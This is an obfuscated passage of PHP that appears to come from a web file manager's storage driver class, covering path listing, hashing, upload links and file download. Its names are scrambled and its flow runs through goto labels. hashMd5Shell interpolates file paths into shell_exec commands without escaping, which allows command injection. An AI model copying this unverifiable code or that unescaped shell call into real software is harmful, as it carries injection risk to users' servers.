REPEAT_RENAME_FOLDER, $Eç¬îÕ­Í½); if ($F‘¥ÇÆÁàÙ) { IO::remove($Bß¸å‡¡Ô÷); } } else { $F‘¥ÇÆÁàÙ = IO::mkdir($DØ‘‡ç‰Ùì); if (!$F‘¥ÇÆÁàÙ) { return !1; } $bæ™ò’Œœ = IO::listPath($Bß¸å‡¡Ô÷, !0); $dœØ—±¦ÇÉ = array_merge($bæ™ò’Œœ[$eƒ¦—¯àß‹[73]], $bæ™ò’Œœ[$eƒ¦—¯àß‹[74]]); foreach ($dœØ—±¦ÇÉ as $DßË‘×¹øˆ) { IO::move($DßË‘×¹øˆ[$eƒ¦—¯àß‹[75]], $DØ‘‡ç‰Ùì, REPEAT_RENAME_FOLDER); } IO::remove($Bß¸å‡¡Ô÷); } goto a‚Ş”Ğ¢Õ; Dìö‰ÓÚà©: $eƒ¦—¯àß‹ =& $_SERVER[ÉóçÄÇ]; $Eç¬îÕ­Í½ = $DØ‘‡ç‰Ùì; Hook::trigger($eƒ¦—¯àß‹[72], $this, $Bß¸å‡¡Ô÷, $this, $this->pathFather($Bß¸å‡¡Ô÷) . $DØ‘‡ç‰Ùì); goto AÈ¿ˆóğÂö; eÄŸèé¾ì: } public function tempFile($f°‰ãƒ»Ùï = '', $F…Ã­ËÀÇ‚ = '') { goto EÓÓï†…Ê; EÓÓï†…Ê: if (!$f°‰ãƒ»Ùï) { $f°‰ãƒ»Ùï = rand_string(15); } $AÀÃ©¸æ¾† = TEMP_FILES . rand_string(15) . $_SERVER[ÉóçÄÇ][8]; @mkdir($AÀÃ©¸æ¾†, 511, !0); goto eÄáø“ç Æ; b¨½õƒâù: return $D‰ª‡÷Û¢; goto B¤Ûáöæ§; eÄáø“ç Æ: $D‰ª‡÷Û¢ = $AÀÃ©¸æ¾† . $f°‰ãƒ»Ùï; @touch($D‰ª‡÷Û¢); if ($F…Ã­ËÀÇ‚) { file_put_contents($D‰ª‡÷Û¢, $F…Ã­ËÀÇ‚); } goto b¨½õƒâù; B¤Ûáöæ§: } public function tempFileRemve($CÈÔ‡ÜÅª”) { @unlink($CÈÔ‡ÜÅª”); @rmdir($this->pathFather($CÈÔ‡ÜÅª”)); } public function mkfile($bêˆŒ¸èœÙ, $b‡à¢Ôò¸¡ = '', $Cî¾Àª® = REPEAT_RENAME) { } public function mkdir($F‰Ïæ¥öé, $A¦×ã‹ö¤´ = REPEAT_SKIP) { } public function delFile($A®÷•çàÜ) { } public function delFolder($F’šèä“çß) { } public function copyFile($f›Ù—¶„½¸, $A˜ƒ°”ò…œ) { } public function moveFile($Fâõ±µÍ×´, $c“¨¾¡åèå) { } public function remove($c‡­š—¦“ç) { if ($this->isFile($c‡­š—¦“ç)) { return $this->delFile($c‡­š—¦“ç); } return $this->delFolder($c‡­š—¦“ç); } public function rename($b¿†ÄÜõù, $cÀõ’ß‡¹º) { } public function exist($aÇÙ±Ÿ…·¢) { } public function findByHash($e¯•îµ¬ô• = '', $E‰ñ§ğ±£ = '') { return !1; } public function isFile($eãÍ¶Ôî®Ö) { } public function isFolder($BÒ†Šê³‚) { } public function size($DÁ´Ä’¾Â‚) { } public function info($E©¿¡–Åßœ) { } public function infoSimple($Eœô÷Şñ) { return $this->info($Eœô÷Şñ); } public function infoAuth($B­ŞõÒ¿µô) { return $this->info($B­ŞõÒ¿µô); } public function infoFull($bÙäÃªÓÀŞ) { return $this->info($bÙäÃªÓÀŞ); } public function infoWithChildren($b›ìïóéÜ“) { $AÓ•Û±×Æš =& $_SERVER[ÉóçÄÇ]; static $DÙ°˜•éªÇ = array(); if (isset($DÙ°˜•éªÇ[$b›ìïóéÜ“])) { return $DÙ°˜•éªÇ[$b›ìïóéÜ“]; } $CÚ”²ì†¥ = $this->info($b›ìïóéÜ“); if ($CÚ”²ì†¥ && $CÚ”²ì†¥[$AÓ•Û±×Æš[29]] == $AÓ•Û±×Æš[76]) { $F©İÂ¬¾Ë = array($AÓ•Û±×Æš[77] => 0, $AÓ•Û±×Æš[78] => 0, $AÓ•Û±×Æš[79] => 0); $this->infoChildren($b›ìïóéÜ“, $F©İÂ¬¾Ë); $CÚ”²ì†¥[$AÓ•Û±×Æš[77]] = $F©İÂ¬¾Ë[$AÓ•Û±×Æš[77]]; $CÚ”²ì†¥[$AÓ•Û±×Æš[80]] = array($AÓ•Û±×Æš[81] => $F©İÂ¬¾Ë[$AÓ•Û±×Æš[78]], $AÓ•Û±×Æš[82] => $F©İÂ¬¾Ë[$AÓ•Û±×Æš[79]]); $DÙ°˜•éªÇ[$b›ìïóéÜ“] = $CÚ”²ì†¥; } return $CÚ”²ì†¥; } public function listPath($BßÈ’ŸÏğí, $fø£ßñ…Ê‡ = false) { } public function has($AÔÌäÀ‡, $fœïŸ§Ú»‰ = false, $EîÎ£œÏğÄ = false) { } public function canRead($DœòÄµˆ­Ó) { } public function canWrite($AãõãÊÎŸË) { } public function getContent($f„ã±«Ğ°¤) { } public function setContent($a™µ°ÈÓÖ, $e†‰¡ºŞ‹ = '') { } protected function infoChildren($f°¥‚…ùÅï, &$Bôù³ÁËÑƒ) { $e†–È¥‡ =& $_SERVER[ÉóçÄÇ]; check_abort_echo(); $a‹ƒõ = $this->listPath($f°¥‚…ùÅï, !0); $a‹ƒõ = array_merge($a‹ƒõ[$e†–È¥‡[74]], $a‹ƒõ[$e†–È¥‡[73]]); foreach ($a‹ƒõ as $d¥œİ–ö”¬) { if ($d¥œİ–ö”¬[$e†–È¥‡[29]] == $e†–È¥‡[76]) { $Bôù³ÁËÑƒ[$e†–È¥‡[79]]++; $AŒ»âÇ‘ÖÄ = $this->getPathInner($d¥œİ–ö”¬[$e†–È¥‡[75]]); $this->infoChildren($AŒ»âÇ‘ÖÄ, $Bôù³ÁËÑƒ); } else { $Bôù³ÁËÑƒ[$e†–È¥‡[78]]++; $Bôù³ÁËÑƒ[$e†–È¥‡[77]] += $d¥œİ–ö”¬[$e†–È¥‡[77]]; } } } public function fileSubstr($dÆ¦ºÇ©ïğ, $B´Ë™¿­›º, $DÃÔ†¯ˆéÈ) { } public function listAll($F÷ÖÊ±ëº) { } public function listAllMake($BÆÒòêÌø, &$a’‘İÚ³Š„) { $AêË”äÆ‰š =& $_SERVER[ÉóçÄÇ]; check_abort_echo(); $aÈ²¸äèø = $this->listPath($BÆÒòêÌø, !0); if (!$aÈ²¸äèø) { return; } $B¨‰½„‡îæ = array_merge($aÈ²¸äèø[$AêË”äÆ‰š[74]], $aÈ²¸äèø[$AêË”äÆ‰š[73]]); foreach ($B¨‰½„‡îæ as $fïˆ“†¢) { goto C§í¤’©Í; eö“™©Æ¶µ: if (isset($fïˆ“†¢[$AêË”äÆ‰š[83]])) { $CÛõÔ›[$AêË”äÆ‰š[83]] = $fïˆ“†¢[$AêË”äÆ‰š[83]]; } if (!$f†•æßÓ°) { $a’‘İÚ³Š„[] = $CÛõÔ›; continue; } $a’‘İÚ³Š„[] = $CÛõÔ›; goto A¤ñóŸß­¾; A¤ñóŸß­¾: $this->listAllMake($fïˆ“†¢[$AêË”äÆ‰š[75]], $a’‘İÚ³Š„); goto AˆìÉ˜Ÿƒ£; C§í¤’©Í: $f†•æßÓ° = $fïˆ“†¢[$AêË”äÆ‰š[29]] == $AêË”äÆ‰š[76]; $CÛõÔ› = array($AêË”äÆ‰š[75] => $fïˆ“†¢[$AêË”äÆ‰š[75]], $AêË”äÆ‰š[76] => $f†•æßÓ°); if (isset($fïˆ“†¢[$AêË”äÆ‰š[77]])) { $CÛõÔ›[$AêË”äÆ‰š[77]] = $fïˆ“†¢[$AêË”äÆ‰š[77]]; } goto eö“™©Æ¶µ; AˆìÉ˜Ÿƒ£: } } public function listAllSimple($B¥¢à¦ĞİØ) { $EÑ½»Åï =& $_SERVER[ÉóçÄÇ]; $fïÔ©ÓîŒŠ = array(); $e¦ÄøÈï×œ = $this->listAll($B¥¢à¦ĞİØ); $Aš¨àøÏÆ® = $this->getPathOuter($B¥¢à¦ĞİØ); foreach ($e¦ÄøÈï×œ as $BÙ•ÎİğŠ×) { goto EŸ¾œÆº§Ş; EŸ¾œÆº§Ş: $D«Š‚¸¿™ = $BÙ•ÎİğŠ×[$EÑ½»Åï[75]]; $Fğ†å²îø‚ = $BÙ•ÎİğŠ×[$EÑ½»Åï[75]]; if (isset($BÙ•ÎİğŠ×[$EÑ½»Åï[84]])) { $D«Š‚¸¿™ = $BÙ•ÎİğŠ×[$EÑ½»Åï[84]][$EÑ½»Åï[75]]; $BÙ•ÎİğŠ×[$EÑ½»Åï[77]] = $BÙ•ÎİğŠ×[$EÑ½»Åï[84]][$EÑ½»Åï[77]]; $BÙ•ÎİğŠ×[$EÑ½»Åï[83]] = $BÙ•ÎİğŠ×[$EÑ½»Åï[84]][$EÑ½»Åï[83]]; } else { $Fğ†å²îø‚ = substr($BÙ•ÎİğŠ×[$EÑ½»Åï[75]], strlen(get_path_father($Aš¨àøÏÆ®))); $Fğ†å²îø‚ = $EÑ½»Åï[8] . ltrim($Fğ†å²îø‚, $EÑ½»Åï[8]); } goto DÕªÏªÄ; DÕªÏªÄ: $B‡ †‚°œÍ = array($EÑ½»Åï[75] => $Fğ†å²îø‚, $EÑ½»Åï[76] => $BÙ•ÎİğŠ×[$EÑ½»Åï[76]]); if (isset($BÙ•ÎİğŠ×[$EÑ½»Åï[77]]) && !$BÙ•ÎİğŠ×[$EÑ½»Åï[76]]) { $B‡ †‚°œÍ[$EÑ½»Åï[77]] = $BÙ•ÎİğŠ×[$EÑ½»Åï[77]]; } if (isset($BÙ•ÎİğŠ×[$EÑ½»Åï[83]])) { $B‡ †‚°œÍ[$EÑ½»Åï[83]] = $BÙ•ÎİğŠ×[$EÑ½»Åï[83]]; } goto AéĞİàâ¡å; AéĞİàâ¡å: if (!$BÙ•ÎİğŠ×[$EÑ½»Åï[76]]) { $B‡ †‚°œÍ[$EÑ½»Åï[85]] = $D«Š‚¸¿™; } $fïÔ©ÓîŒŠ[] = $B‡ †‚°œÍ; goto d¢ÖæèÊ—; d¢ÖæèÊ—: } return $fïÔ©ÓîŒŠ; } public function upload($AÚŒÙÅ¨î, $cÎÉ…é‹—Ç, $B¾©ã¹Ûä = false, $dØªá±ä‰ù = REPEAT_REPLACE) { } public function uploadFileByID($c‘òÙï‡¨, $DÈñŞÎ«êÔ, $fŞ……ñÍÒ°) { } public function uploadFileByPath($a‡’îÓğå, $céºãå‰¦, $fÂÆñôÅ¨ = array()) { } public function isUploadServer() { $e”’¯ÌŒÕ =& $_SERVER[ÉóçÄÇ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $e”’¯ÌŒÕ[86]) { return !0; } return $GLOBALS[$e”’¯ÌŒÕ[6]][$e”’¯ÌŒÕ[87]][$e”’¯ÌŒÕ[88]]; } public function isFileOutServer() { $eï‚¹µ£• =& $_SERVER[ÉóçÄÇ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $eï‚¹µ£•[86]) { return !0; } return $GLOBALS[$eï‚¹µ£•[6]][$eï‚¹µ£•[87]][$eï‚¹µ£•[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($bğØ–å“¥Ÿ) { $aÏŞ£¨Ï´£ =& $_SERVER[ÉóçÄÇ]; if (!$this->isCdnHost()) { return $bğØ–å“¥Ÿ; } return str_replace(trim(get_url_root($bğØ–å“¥Ÿ), $aÏŞ£¨Ï´£[8]), trim($this->cdnHost, $aÏŞ£¨Ï´£[8]), $bğØ–å“¥Ÿ); } public function uploadLink($eÛ‡¾Ğ„¿¬, $fµùòÉ­’ = 0) { goto eŸ¾¿ïÈ¾; eì±„ù‘äµ: if (!in_array($E£Üó’¹ôä, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $D¯³Ğí‚Ã = 1024 * 1024 * 10; goto d»¦ÅŠ÷ùÌ; Eõ¹‰©Ø˜·: if ($FÑœİ…‰¹Â) { $FÑœİ…‰¹Â[$B§Ú•—­Ø¶[92]] = $eÛ‡¾Ğ„¿¬; $FÑœİ…‰¹Â[$B§Ú•—­Ø¶[93]] = $E£Üó’¹ôä; } return $FÑœİ…‰¹Â; goto bõ­²Ãóõ®; d»¦ÅŠ÷ùÌ: $EÉÇ‘©ë© = $fµùòÉ­’ <= $D¯³Ğí‚Ã ? $B§Ú•—­Ø¶[90] : $B§Ú•—­Ø¶[91]; $AÕŠ²©Ã¿ = (!$fµùòÉ­’ ? 1 : ceil($fµùòÉ­’ / pow(1024, 3))) * 3600 * 4; $FÑœİ…‰¹Â = $this->{$EÉÇ‘©ë©}($eÛ‡¾Ğ„¿¬, $AÕŠ²©Ã¿); goto Eõ¹‰©Ø˜·; eŸ¾¿ïÈ¾: $B§Ú•—­Ø¶ =& $_SERVER[ÉóçÄÇ]; if ($this->isUploadServer()) { return; } $E£Üó’¹ôä = $this->getType(); goto eì±„ù‘äµ; bõ­²Ãóõ®: } public function uploadFormData($dêãâÍ•õ¦, $D¶º¦÷°’ = 3600) { } public function multiUploadFormData($f‚¤Ğ†à³‘, $eæ½¸ø­„ = 3600) { } public function download($a÷ÑĞ£’ÖÑ, $e£„çŒ‰çò) { } public function ext($fŠÔª­ç‰æ) { $bÃ–î¨à‚ =& $_SERVER[ÉóçÄÇ]; if (strpos($fŠÔª­ç‰æ, $bÃ–î¨à‚[8]) === -1) { $A»¥­Ç–“‰ = $fŠÔª­ç‰æ; } else { $A»¥­Ç–“‰ = $this->pathThis($fŠÔª­ç‰æ); } $D¢Ä­ëÕ« = $bÃ–î¨à‚[33]; if (strstr($A»¥­Ç–“‰, $bÃ–î¨à‚[94])) { $D¢Ä­ëÕ« = substr($A»¥­Ç–“‰, strrpos($A»¥­Ç–“‰, $bÃ–î¨à‚[94]) + 1); $D¢Ä­ëÕ« = strtolower($D¢Ä­ëÕ«); } if (strlen($D¢Ä­ëÕ«) > 3 && preg_match($bÃ–î¨à‚[95], $D¢Ä­ëÕ«, $e©©æØ…Ñ†)) { $D¢Ä­ëÕ« = $bÃ–î¨à‚[33]; } return $D¢Ä­ëÕ«; } public function pathThis($Cœ„îĞ«ó) { $B·Û¼£ˆ£Ï =& $_SERVER[ÉóçÄÇ]; $Cœ„îĞ«ó = str_replace($B·Û¼£ˆ£Ï[96], $B·Û¼£ˆ£Ï[8], rtrim($Cœ„îĞ«ó, $B·Û¼£ˆ£Ï[8])); $c¥œ¶¨ ¸ = strrpos($Cœ„îĞ«ó, $B·Û¼£ˆ£Ï[8]); if ($c¥œ¶¨ ¸ === !1) { return $Cœ„îĞ«ó; } return substr($Cœ„îĞ«ó, $c¥œ¶¨ ¸ + 1); } public function pathFather($aÚËÁØéğÑ) { $F½ä´ÚÜÄµ =& $_SERVER[ÉóçÄÇ]; $aÚËÁØéğÑ = str_replace($F½ä´ÚÜÄµ[96], $F½ä´ÚÜÄµ[8], rtrim($aÚËÁØéğÑ, $F½ä´ÚÜÄµ[8])); $EÏÑ‰£Ôªø = strrpos($aÚËÁØéğÑ, $F½ä´ÚÜÄµ[8]); if ($EÏÑ‰£Ôªø === !1) { return $F½ä´ÚÜÄµ[33]; } return substr($aÚËÁØéğÑ, 0, $EÏÑ‰£Ôªø + 1); } public function hashSimple($aÊ¦õÈ‹Š¹) { goto e²Ñ°äÖ Ö; b×Ä½èÏ÷ : $aäÌ”–‰ä = intval($eĞå†ÏÊ»Œ / $Aä”ì¥Š¸¦); $bğá‚˜µ¶… = $cæ¡…óôÄÓ[33]; for ($E´ÊÌ›ƒñˆ = 0; $E´ÊÌ›ƒñˆ < $Aä”ì¥Š¸¦; $E´ÊÌ›ƒñˆ++) { $bğá‚˜µ¶… .= $this->fileSubstr($aÊ¦õÈ‹Š¹, $aäÌ”–‰ä * $E´ÊÌ›ƒñˆ, $cá«æÂ¸); } goto e­ìª¤ñîî; e­ìª¤ñîî: $bğá‚˜µ¶… .= $this->fileSubstr($aÊ¦õÈ‹Š¹, $eĞå†ÏÊ»Œ - $cá«æÂ¸, $cá«æÂ¸); return md5($bğá‚˜µ¶…) . $eĞå†ÏÊ»Œ; goto fÑÔ™ÍÓì¡; DÍö‚ºÕØË: $cá«æÂ¸ = 200; $Aä”ì¥Š¸¦ = 50; if ($eĞå†ÏÊ»Œ <= $cá«æÂ¸ * $Aä”ì¥Š¸¦) { return $this->hashMd5($aÊ¦õÈ‹Š¹) . $eĞå†ÏÊ»Œ; } goto b×Ä½èÏ÷ ; e²Ñ°äÖ Ö: $cæ¡…óôÄÓ =& $_SERVER[ÉóçÄÇ]; if (!$aÊ¦õÈ‹Š¹) { return md5($cæ¡…óôÄÓ[33]); } $eĞå†ÏÊ»Œ = $this->size($aÊ¦õÈ‹Š¹); goto DÍö‚ºÕØË; fÑÔ™ÍÓì¡: } public static $md5Cache = array(); public function hashMd5($dí–áİÏ‘Ï) { $dí–áİÏ‘Ï = $this->iconvSystem($dí–áİÏ‘Ï); if (isset(self::$md5Cache[$dí–áİÏ‘Ï])) { return self::$md5Cache[$dí–áİÏ‘Ï]; } self::$md5Cache[$dí–áİÏ‘Ï] = $this->hashMd5Shell($dí–áİÏ‘Ï); if (!self::$md5Cache[$dí–áİÏ‘Ï]) { self::$md5Cache[$dí–áİÏ‘Ï] = @md5_file($dí–áİÏ‘Ï); } return self::$md5Cache[$dí–áİÏ‘Ï]; } private function hashMd5Shell($d¡ç¥„¥) { goto d–Öª¯ˆ“; a…ŸÅÄ¯¯©: $dŠŞ×ˆÙ’ = Cache::get($bŠàä˜šãß[100]); if (!$dŠŞ×ˆÙ’) { $eÎ¢¸»¡Ã = BASIC_PATH . $bŠàä˜šãß[101]; $dùáß‡¿‰Ñ = md5_file($eÎ¢¸»¡Ã); $dŠŞ×ˆÙ’ = $bŠàä˜šãß[102]; foreach ($e¿²²ï–”œ as $eò‚âË¬Ö) { $c½›Ê¹š = shell_exec($eò‚âË¬Ö . "\40\x22{$eÎ¢¸»¡Ã}\42"); if ($c½›Ê¹š && substr(trim($c½›Ê¹š), 0, 32) == $dùáß‡¿‰Ñ) { $dŠŞ×ˆÙ’ = $eò‚âË¬Ö; break; } } Cache::set($bŠàä˜šãß[100], $dŠŞ×ˆÙ’, 3600); } if ($dŠŞ×ˆÙ’ == $bŠàä˜šãß[102]) { return !1; } goto EÙ“åÓ¬; EÙ“åÓ¬: $c½›Ê¹š = shell_exec($dŠŞ×ˆÙ’ . "\x20\x22{$d¡ç¥„¥}\x22"); $c½›Ê¹š = str_replace($bŠàä˜šãß[103], $bŠàä˜šãß[33], $c½›Ê¹š); return substr($c½›Ê¹š, 0, 32); goto EóçÁ’±’Ö; d–Öª¯ˆ“: $bŠàä˜šãß =& $_SERVER[ÉóçÄÇ]; if (!function_exists($bŠàä˜šãß[97])) { return !1; } $e¿²²ï–”œ = array($bŠàä˜šãß[98], $bŠàä˜šãß[99]); goto a…ŸÅÄ¯¯©; EóçÁ’±’Ö: } public function link($bí‹“Ê‹‰¯) { return $bí‹“Ê‹‰¯; } public function fileOut($eÏ”¾ïØÛ, $aÕÅÒóâˆ = false, $e›Á—¨©‚Ş = false, $Açƒš¶ˆ„¼ = '') { goto d‘âÙŞ¨ª; d§µóÀîÎ„: header($BŞê½çŞ¤±[119]); header($BŞê½çŞ¤±[120] . $AŸØ‚ä§¢¾); $dóòø¼»“½ = rawurlencode($e —õğ…ˆÕ); goto eÛÏÒ„ùÕœ; bÈ¡ï³ôê÷: header($BŞê½çŞ¤±[137] . $bØù‡‚¿½Ì); header($BŞê½çŞ¤±[138]); if (!$aÕÅÒóâˆ && $aÛÆäæ„ø‰ == $BŞê½çŞ¤±[139]) { if ($bØù‡‚¿½Ì > 1024 * 1024 * 5) { die; } $c½ŒŠ¤º§‚ = $this->getContent($eÏ”¾ïØÛ); $c½ŒŠ¤º§‚ = Html::clearSVG($c½ŒŠ¤º§‚); header($BŞê½çŞ¤±[140] . strlen($c½ŒŠ¤º§‚)); echo $c½ŒŠ¤º§‚; die; } goto DğÁŞî²•; C¨Üê¾ÂÃè: header($BŞê½çŞ¤±[127]); header($BŞê½çŞ¤±[128]); header($BŞê½çŞ¤±[129]); goto AĞõÈÉâ™‚; CÆØÏ¬¤°„: if (in_array($aÛÆäæ„ø‰, array($BŞê½çŞ¤±[110], $BŞê½çŞ¤±[111], $BŞê½çŞ¤±[112], $BŞê½çŞ¤±[113]))) { $aÛÆäæ„ø‰ = $BŞê½çŞ¤±[114]; } if (!$Açƒš¶ˆ„¼) { $Açƒš¶ˆ„¼ = md5($bØäïÆ«Î¤ . $this->hashSimple($eÏ”¾ïØÛ)); } $Açƒš¶ˆ„¼ = $BŞê½çŞ¤±[115] . $Açƒš¶ˆ„¼ . $BŞê½çŞ¤±[115]; goto d ¥ÍÚèì›; F—†Êš¬òŒ: $E†çìÊªòõ = !0; if ($_SERVER[$BŞê½çŞ¤±[153]] == $BŞê½çŞ¤±[154] && $bØù‡‚¿½Ì > 1204 * 1024 * 1024 * 2) { $E†çìÊªòõ = !1; } if ($E†çìÊªòõ) { header($BŞê½çŞ¤±[155] . ($a‰Œ–ìÉ¹ - $b„¢†‚ËÖí + 1)); } goto Dë¿Á¹×Å; cÌ•¹¦ëâÜ: if ($BÅÎİ²©Ü) { $dÏêàÅ„° = intval(1000 * 1000 * ($E‡÷“ˆÈø¦ / $BÅÎİ²©Ü)); } while ($b„¢†‚ËÖí <= $a‰Œ–ìÉ¹) { $CÅë½¡ù = timeFloat(); check_abort(); $B³‚ˆ“¹ÚÇ = $a‰Œ–ìÉ¹ - $b„¢†‚ËÖí + 1; if ($B³‚ˆ“¹ÚÇ <= $E‡÷“ˆÈø¦) { $E‡÷“ˆÈø¦ = $B³‚ˆ“¹ÚÇ; } echo $this->fileSubstr($eÏ”¾ïØÛ, $b„¢†‚ËÖí, $E‡÷“ˆÈø¦); $b„¢†‚ËÖí += $E‡÷“ˆÈø¦; if ($E‡÷“ˆÈø¦ == $B³‚ˆ“¹ÚÇ) { $b„¢†‚ËÖí = $a‰Œ–ìÉ¹ + 1; } if ($dÏêàÅ„°) { $Bçµ¤—¼ì = intval(1000 * 1000 * (timeFloat() - $CÅë½¡ù)); $A§ïğÕä = $dÏêàÅ„° - $Bçµ¤—¼ì; if ($A§ïğÕä > 5) { usleep($A§ïğÕä); } } } goto c”Üµ²ƒåÕ; d ¥ÍÚèì›: $AŸØ‚ä§¢¾ = get_file_mime($aÛÆäæ„ø‰); if (strstr($AŸØ‚ä§¢¾, $BŞê½çŞ¤±[116])) { $AŸØ‚ä§¢¾ = $AŸØ‚ä§¢¾ . $BŞê½çŞ¤±[117]; } if ($aÕÅÒóâˆ === !1 && !mime_support($AŸØ‚ä§¢¾)) { $aÕÅÒóâˆ = !0; $AŸØ‚ä§¢¾ = $BŞê½çŞ¤±[118]; } goto d§µóÀîÎ„; Dë¿Á¹×Å: if ($_SERVER[$BŞê½çŞ¤±[156]] == $BŞê½çŞ¤±[157]) { return; } $E‡÷“ˆÈø¦ = 1024 * 100; $dÏêàÅ„° = 0; goto cÌ•¹¦ëâÜ; Aõ’»Îˆ‚¿: $Aªì¦„ÕÖÂ = $this->getType() == $BŞê½çŞ¤±[105]; $B©ê˜‡ÔÏ„ = $GLOBALS[$BŞê½çŞ¤±[6]][$BŞê½çŞ¤±[87]][$BŞê½çŞ¤±[106]][$BŞê½çŞ¤±[107]]; $BÅÎİ²©Ü = (double) $GLOBALS[$BŞê½çŞ¤±[6]][$BŞê½çŞ¤±[87]][$BŞê½çŞ¤±[106]][$BŞê½çŞ¤±[108]] * 1024 * 1024; goto câÔ«˜á; DğÁŞî²•: $a‹Ş·Ü©Ç = strtolower($_SERVER[$BŞê½çŞ¤±[141]]); if ($Aªì¦„ÕÖÂ && $a‹Ş·Ü©Ç && $B©ê˜‡ÔÏ„) { if (strstr($a‹Ş·Ü©Ç, $BŞê½çŞ¤±[142])) { header($BŞê½çŞ¤±[143] . $eÏ”¾ïØÛ); } else { if (strstr($a‹Ş·Ü©Ç, $BŞê½çŞ¤±[144])) { header($BŞê½çŞ¤±[145] . $eÏ”¾ïØÛ); } else { if (strstr($a‹Ş·Ü©Ç, $BŞê½çŞ¤±[146])) { header($BŞê½çŞ¤±[147] . $eÏ”¾ïØÛ); } } } if ($BÅÎİ²©Ü) { header($BŞê½çŞ¤±[148] . $BÅÎİ²©Ü); } return; } if (isset($_SERVER[$BŞê½çŞ¤±[149]])) { if (preg_match($BŞê½çŞ¤±[150], $_SERVER[$BŞê½çŞ¤±[149]], $A½¶£ÊŒÚí)) { $b„¢†‚ËÖí = intval($A½¶£ÊŒÚí[1]); if (!empty($A½¶£ÊŒÚí[2])) { $a‰Œ–ìÉ¹ = intval($A½¶£ÊŒÚí[2]); } } header($BŞê½çŞ¤±[151]); header("\x43\157\156\x74\145\x6e\x74\55\x52\141\156\147\x65\x3a\x20\x62\171\164\x65\163\x20{$b„¢†‚ËÖí}\x2d{$a‰Œ–ìÉ¹}\x2f" . $bØù‡‚¿½Ì); } else { header($BŞê½çŞ¤±[152]); } goto F—†Êš¬òŒ; eÛ·–İğšš: $bØù‡‚¿½Ì = $cÓèê‡Ê—æ[$BŞê½çŞ¤±[77]]; $bØäïÆ«Î¤ = gmdate($BŞê½çŞ¤±[109], $cÓèê‡Ê—æ[$BŞê½çŞ¤±[83]]); $e —õğ…ˆÕ = $e›Á—¨©‚Ş ? $e›Á—¨©‚Ş : $this->iconvApp($cÓèê‡Ê—æ[$BŞê½çŞ¤±[28]]); goto EğÖÉ‡ö’; EğÖÉ‡ö’: $b„¢†‚ËÖí = 0; $a‰Œ–ìÉ¹ = $bØù‡‚¿½Ì - 1; $aÛÆäæ„ø‰ = $this->ext($e —õğ…ˆÕ); goto CÆØÏ¬¤°„; câÔ«˜á: @ob_end_clean(); set_timeout(); $cÓèê‡Ê—æ = $this->infoFull($eÏ”¾ïØÛ); goto eÛ·–İğšš; eÛÏÒ„ùÕœ: $dóòø¼»“½ = $BŞê½çŞ¤±[115] . $dóòø¼»“½ . $BŞê½çŞ¤±[121] . $dóòø¼»“½; if ($aÕÅÒóâˆ) { header($BŞê½çŞ¤±[122]); header($BŞê½çŞ¤±[123] . $dóòø¼»“½); } else { header($BŞê½çŞ¤±[124] . $dóòø¼»“½); } header($BŞê½çŞ¤±[125] . gmdate($BŞê½çŞ¤±[109], time() + 3600 * 24 * 30) . $BŞê½çŞ¤±[126]); goto C¨Üê¾ÂÃè; d‘âÙŞ¨ª: $BŞê½çŞ¤± =& $_SERVER[ÉóçÄÇ]; $this->cacheMethod(null, null); if (!$eÏ”¾ïØÛ || !$this->exist($eÏ”¾ïØÛ)) { show_json(LNG($BŞê½çŞ¤±[104]), !1, $e›Á—¨©‚Ş); } goto Aõ’»Îˆ‚¿; AÏô›äİ§: header($BŞê½çŞ¤±[134] . $bØäïÆ«Î¤ . $BŞê½çŞ¤±[126]); header($BŞê½çŞ¤±[135] . $e —õğ…ˆÕ); header($BŞê½çŞ¤±[136]); goto bÈ¡ï³ôê÷; AĞõÈÉâ™‚: if (isset($_SERVER[$BŞê½çŞ¤±[130]]) && strtotime($_SERVER[$BŞê½çŞ¤±[130]]) == $cÓèê‡Ê—æ[$BŞê½çŞ¤±[83]]) { header($BŞê½çŞ¤±[131], !0, 304); die; } if (isset($_SERVER[$BŞê½çŞ¤±[132]]) && $_SERVER[$BŞê½çŞ¤±[132]] == $Açƒš¶ˆ„¼) { header($BŞê½çŞ¤±[133] . $Açƒš¶ˆ„¼, !0, 304); die; } header($BŞê½çŞ¤±[133] . $Açƒš¶ˆ„¼); goto AÏô›äİ§; c”Üµ²ƒåÕ: } public function fileOutServer($e‚îÌ¯ƒöÄ, $f•‘ê¥›Ã = false, $BÓÉ ˜£§ã = false, $F×•İèàù = '') { $this->fileOut($e‚îÌ¯ƒöÄ, $f•‘ê¥›Ã, $BÓÉ ˜£§ã, $F×•İèàù); } public function fileOutLink($aÀÏ½Ÿ©) { header($_SERVER[ÉóçÄÇ][158] . $aÀÏ½Ÿ©); die; } public function cacheMethod($AŠíñØâ¸ù, $D·á„ºº“, $aŸ¥¢Óù‘Õ = null) { goto c‹ÏÒ£›­ì; c‹ÏÒ£›­ì: $c¦ââò™Ñ‘ =& $_SERVER[ÉóçÄÇ]; static $dµ«ğ›È‰„ = array(); $a‚Ø öï¹ = $D·á„ºº“ ? ltrim($this->getPathOuter($D·á„ºº“), $c¦ââò™Ñ‘[8]) : $D·á„ºº“; goto A˜Ş¯Ûæ’ç; A˜Ş¯Ûæ’ç: $A¼‚‹à´ÉÁ = $c¦ââò™Ñ‘[159] . $AŠíñØâ¸ù . $c¦ââò™Ñ‘[160] . rtrim($a‚Ø öï¹, $c¦ââò™Ñ‘[8]); if (is_null($AŠíñØâ¸ù)) { $dµ«ğ›È‰„ = array(); return; } if (is_null($D·á„ºº“)) { unset($dµ«ğ›È‰„[$A¼‚‹à´ÉÁ]); return; } goto d±·äË—Õ; BĞ…‹ëêàÉ: $fÑÙ¶¬¯¡İ = $this->{$AŠíñØâ¸ù}($D·á„ºº“); $dµ«ğ›È‰„[$A¼‚‹à´ÉÁ] = $fÑÙ¶¬¯¡İ; return $fÑÙ¶¬¯¡İ; goto c´’ÍùØ¦; d±·äË—Õ: if (!is_null($aŸ¥¢Óù‘Õ)) { $dµ«ğ›È‰„[$A¼‚‹à´ÉÁ] = $aŸ¥¢Óù‘Õ; return; } $fÑÙ¶¬¯¡İ = isset($dµ«ğ›È‰„[$A¼‚‹à´ÉÁ]) ? $dµ«ğ›È‰„[$A¼‚‹à´ÉÁ] : null; if (!is_null($fÑÙ¶¬¯¡İ)) { return $fÑÙ¶¬¯¡İ; } goto BĞ…‹ëêàÉ; c´’ÍùØ¦: } public function 